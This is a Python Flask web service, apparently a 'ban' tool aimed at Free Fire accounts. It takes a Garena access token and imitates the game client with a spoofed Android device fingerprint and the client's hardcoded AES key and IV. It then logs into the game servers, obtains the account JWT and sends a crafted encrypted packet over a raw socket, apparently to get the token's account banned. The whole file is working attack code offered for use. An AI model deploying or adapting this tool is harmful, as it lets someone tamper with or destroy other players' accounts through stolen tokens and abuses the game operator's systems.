from flask import Flask, request, jsonify, render_template, send_from_directory
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import MajorLogin_res_pb2
from datetime import datetime
from google.protobuf.timestamp_pb2 import Timestamp
import base64
import json
import socket
import traceback
import urllib3
import warnings
import os

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')

# Flask App Initialization
app = Flask(__name__,
            template_folder='templates',
            static_folder='static',
            static_url_path='/static')
app.config['JSON_AS_ASCII'] = False

# ----------------- SimpleProtobuf Class -----------------
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)
    
    @staticmethod
    def decode_varint(data, start_index=0):
        value = 0
        shift = 0
        index = start_index
        while index < len(data):
            byte = data[index]
            index += 1
            value |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return value, index
    
    @staticmethod
    def parse_protobuf(data):
        result = {}
        index = 0
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[field_num] = value
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        result[field_num] = value_bytes.decode('utf-8')
                    except UnicodeDecodeError:
                        result[field_num] = value_bytes
            else:
                break
        return result
    
    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)
    
    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)
    
    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, current_time))
        payload.extend(SimpleProtobuf.encode_string(4, 'free fire'))
        payload.extend(SimpleProtobuf.encode_int32(5, 1))
        payload.extend(SimpleProtobuf.encode_string(7, '2.111.2'))
        payload.extend(SimpleProtobuf.encode_string(8, 'Android OS 12 / API-31 (SP1A.210812.016/T505NDXS6CXB1)'))
        payload.extend(SimpleProtobuf.encode_string(9, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(10, 'we'))
        payload.extend(SimpleProtobuf.encode_string(11, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_int32(12, 1334))
        payload.extend(SimpleProtobuf.encode_int32(13, 800))
        payload.extend(SimpleProtobuf.encode_string(14, '225'))
        payload.extend(SimpleProtobuf.encode_string(15, 'ARM64 FP ASIMD AES | 4032 | 8'))
        payload.extend(SimpleProtobuf.encode_int32(16, 2705))
        payload.extend(SimpleProtobuf.encode_string(17, 'Adreno (TM) 610'))
        payload.extend(SimpleProtobuf.encode_string(18, 'OpenGL ES 3.2 V@0502.0 (GIT@5eaa426211, I07ee46fc66, 1633700387) (Date:10/08/21)'))
        payload.extend(SimpleProtobuf.encode_string(19, 'Google|dbc5b426-9715-454a-9466-6c82e151d407'))
        payload.extend(SimpleProtobuf.encode_string(20, '154.183.6.12'))
        payload.extend(SimpleProtobuf.encode_string(21, 'ar'))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(24, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(25, 'samsung SM-T505N'))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_int32(30, 1))
        payload.extend(SimpleProtobuf.encode_string(41, 'we'))
        payload.extend(SimpleProtobuf.encode_string(42, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_string(57, 'e89b158e4bcf988ebd09eb83f5378e87'))
        payload.extend(SimpleProtobuf.encode_int32(60, 22394))
        payload.extend(SimpleProtobuf.encode_int32(61, 1424))
        payload.extend(SimpleProtobuf.encode_int32(62, 3349))
        payload.extend(SimpleProtobuf.encode_int32(63, 24))
        payload.extend(SimpleProtobuf.encode_int32(64, 1552))
        payload.extend(SimpleProtobuf.encode_int32(65, 22394))
        payload.extend(SimpleProtobuf.encode_int32(66, 1552))
        payload.extend(SimpleProtobuf.encode_int32(67, 22394))
        payload.extend(SimpleProtobuf.encode_int32(73, 1))
        payload.extend(SimpleProtobuf.encode_string(74, '/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefiremax-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64'))
        payload.extend(SimpleProtobuf.encode_int32(76, 2))
        payload.extend(SimpleProtobuf.encode_string(77, 'b4d2689433917e66100ba91db790bf37|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefiremax-i72Sh_-sI0zZHs5Bw6aufg==/base.apk'))
        payload.extend(SimpleProtobuf.encode_int32(78, 2))
        payload.extend(SimpleProtobuf.encode_int32(79, 2))
        payload.extend(SimpleProtobuf.encode_string(81, '64'))
        payload.extend(SimpleProtobuf.encode_string(83, '2019115296'))
        payload.extend(SimpleProtobuf.encode_int32(85, 1))
        payload.extend(SimpleProtobuf.encode_string(86, 'OpenGLES3'))
        payload.extend(SimpleProtobuf.encode_int32(87, 16383))
        payload.extend(SimpleProtobuf.encode_int32(88, 4))
        payload.extend(SimpleProtobuf.encode_string(90, 'Damanhur'))
        payload.extend(SimpleProtobuf.encode_string(91, 'BH'))
        payload.extend(SimpleProtobuf.encode_int32(92, 31095))
        payload.extend(SimpleProtobuf.encode_string(93, 'android_max'))
        payload.extend(SimpleProtobuf.encode_string(94, 'KqsHTzpfADfqKnEg/KMctJLElsm8bN2M4ts0zq+ifY+560USyjMSDL386RFrwRloT0ZSbMxEuM+Y4FSvjghQQZXWWpY='))
        payload.extend(SimpleProtobuf.encode_int32(97, 1))
        payload.extend(SimpleProtobuf.encode_int32(98, 1))
        payload.extend(SimpleProtobuf.encode_string(99, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(100, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(102, ''))
        return bytes(payload)

# ----------------- Helper Functions -----------------
def b64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def get_available_room(input_text):
    try:
        data = bytes.fromhex(input_text)
        result = {}
        index = 0
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    value |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"wire_type": "varint", "data": value}
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        value_str = value_bytes.decode('utf-8')
                        result[str(field_num)] = {"wire_type": "string", "data": value_str}
                    except:
                        result[str(field_num)] = {"wire_type": "bytes", "data": value_bytes.hex()}
            else:
                break
        return json.dumps(result)
    except Exception:
        return None

def extract_jwt_payload_dict(jwt_s: str):
    try:
        parts = jwt_s.split('.')
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        payload_bytes = b64url_decode(payload_b64)
        return json.loads(payload_bytes.decode('utf-8', errors='ignore'))
    except Exception:
        return None

def encrypt_packet(hex_string: str, aes_key, aes_iv) -> str:
    if isinstance(aes_key, str):
        aes_key = bytes.fromhex(aes_key)
    if isinstance(aes_iv, str):
        aes_iv = bytes.fromhex(aes_iv)
    data = bytes.fromhex(hex_string)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    return cipher.encrypt(pad(data, AES.block_size)).hex()

def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> str:
    try:
        encrypted = encrypt_packet(jwt.encode().hex(), key, iv)
        head_len = hex(len(encrypted) // 2)[2:]
        ide_hex = hex(int(account_id))[2:]
        zeros = "0" * (16 - len(ide_hex))
        timestamp_hex = hex(timestamp)[2:].zfill(2)
        head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
        return head + encrypted
    except Exception:
        return None

def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=5.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(recv_timeout)
    try:
        s.connect((remote_ip, remote_port))
        s.sendall(payload_bytes)
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass  # Expected timeout after receiving chunks
        return b"".join(chunks)
    except Exception as e:
        raise Exception(f"Socket connection blocked or timed out. Error: {str(e)}")
    finally:
        s.close()

# ----------------- Flask Routes -----------------
@app.route('/')
def index():
    try:
        return render_template('index.html')
    except Exception as e:
        return f"<h1>Template Load Error</h1><p>{str(e)}</p>", 500

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/api/ban', methods=['POST'])
def ban_account():
    try:
        data = request.get_json()
        if not data or not data.get('accessToken'):
            return jsonify({'success': False, 'error': 'Access Token দেওয়া আবশ্যক!'}), 400
        
        access_token = data.get('accessToken').strip()
        
        # Step 1: Inspect Token
        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
        inspect_headers = {
            "Host": "100067.connect.garena.com",
            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
        }
        
        try:
            resp = requests.get(inspect_url, headers=inspect_headers, timeout=10)
            inspect_data = resp.json()
            if 'error' in inspect_data:
                return jsonify({'success': False, 'error': f"Invalid Token: {inspect_data.get('error')}"}), 400
        except Exception:
            return jsonify({'success': False, 'error': "টোকেন চেক করতে সমস্যা হচ্ছে সার্ভারে।"}), 500
            
        NEW_OPEN_ID = inspect_data.get('open_id')
        platform_ = inspect_data.get('platform')
        
        if not NEW_OPEN_ID:
            return jsonify({'success': False, 'error': "টোকেন থেকে Open ID পাওয়া যায়নি।"}), 400

        # Step 2: MajorLogin
        key = b'Yg&tc%DEuh6%Zc^8'
        iv = b'6oyZDr22E3ychjM%'
        MajorLogin_url = "https://loginbp.ggblueshark.com/MajorLogin"
        MajorLogin_headers = {
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
            "Content-Type": "application/octet-stream",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB52"
        }
        
        data_pb = SimpleProtobuf.create_login_payload(NEW_OPEN_ID, access_token, str(platform_))
        enc_data = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data_pb, 16))
        
        try:
            response = requests.post(MajorLogin_url, headers=MajorLogin_headers, data=enc_data, timeout=15)
            if not response.ok:
                return jsonify({'success': False, 'error': "গেম সার্ভারে লগিন করা যায়নি।"}), 500
        except Exception:
            return jsonify({'success': False, 'error': "MajorLogin রিকোয়েস্ট ফেইল হয়েছে।"}), 500
        
        # Decode MajorLogin response
        resp_enc = response.content
        resp_msg = MajorLogin_res_pb2.MajorLoginRes()
        cipher_resp = AES.new(key, AES.MODE_CBC, iv)
        try:
            resp_dec = unpad(cipher_resp.decrypt(resp_enc), 16)
            resp_msg.ParseFromString(resp_dec)
            parsed_data = SimpleProtobuf.parse_protobuf(resp_dec)
        except Exception:
            resp_msg.ParseFromString(resp_enc)
            parsed_data = SimpleProtobuf.parse_protobuf(resp_enc)

        if not resp_msg.account_jwt:
            return jsonify({'success': False, 'error': "অ্যাকাউন্টের JWT পাওয়া যায়নি।"}), 500

        # Calculate Timestamp
        field_21_value = parsed_data.get(21, None) if parsed_data else None
        if field_21_value:
            ts = Timestamp()
            ts.FromNanoseconds(field_21_value)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos
        else:
            payload = extract_jwt_payload_dict(resp_msg.account_jwt)
            exp = int(payload.get("exp", 0)) if payload else 0
            ts = Timestamp()
            ts.FromNanoseconds(exp * 1_000_000_000)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos

        # Step 3: GetLoginData
        GetLoginData_resURL = "https://clientbp.ggblueshark.com/GetLoginData"
        GetLoginData_res_headers = {
            'Authorization': f'Bearer {resp_msg.account_jwt}',
            'X-Unity-Version': '2018.4.11f1',
            'ReleaseVersion': 'OB52',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
        }
        
        try:
            r2 = requests.post(GetLoginData_resURL, headers=GetLoginData_res_headers, data=enc_data, timeout=15, verify=False)
        except Exception:
            return jsonify({'success': False, 'error': "সার্ভারের আইপি ও পোর্ট সংগ্রহ করতে ব্যর্থ।"}), 500
        
        online_ip, online_port = None, None
        if r2.status_code == 200:
            json_result = get_available_room(r2.content.hex())
            if json_result:
                parsed_data_login = json.loads(json_result)
                if '14' in parsed_data_login and 'data' in parsed_data_login['14']:
                    addr = parsed_data_login['14']['data']
                    online_ip = addr[:-6]
                    online_port = int(addr[-5:])
        
        if not online_ip or not online_port:
            return jsonify({'success': False, 'error': "আইপি ও পোর্ট পাওয়া যায়নি।"}), 500

        # Step 4: Final Packet
        payload_jwt = extract_jwt_payload_dict(resp_msg.account_jwt)
        account_id = int(payload_jwt.get("account_id", 0)) if payload_jwt else 0
        
        final_token_hex = build_start_packet(account_id, timetamp, resp_msg.account_jwt, resp_msg.key, resp_msg.iv)
        
        # Step 5: Socket Execution
        try:
            payload_bytes = bytes.fromhex(final_token_hex)
            send_once(online_ip, online_port, payload_bytes, recv_timeout=5.0)
            
            return jsonify({
                'success': True,
                'data': {
                    'account_id': account_id,
                    'open_id': NEW_OPEN_ID,
                    'server_ip': online_ip,
                    'server_port': online_port
                }
            })
            
        except Exception as e:
            # যদি Vercel এ হোস্ট করেন তাহলে এই Error আসবে, কারণ Vercel পোর্ট ব্লক করে দেয়
            return jsonify({'success': False, 'error': f"Game Server Connection Blocked by Host! (Vercel-এ সকেট সাপোর্ট করে না) - {str(e)}"}), 500
            
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'error': 'সার্ভারে অভ্যন্তরীণ সমস্যা দেখা দিয়েছে।'}), 500

@app.route('/api/health')
def health_check():
    return jsonify({'status': 'Running', 'time': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
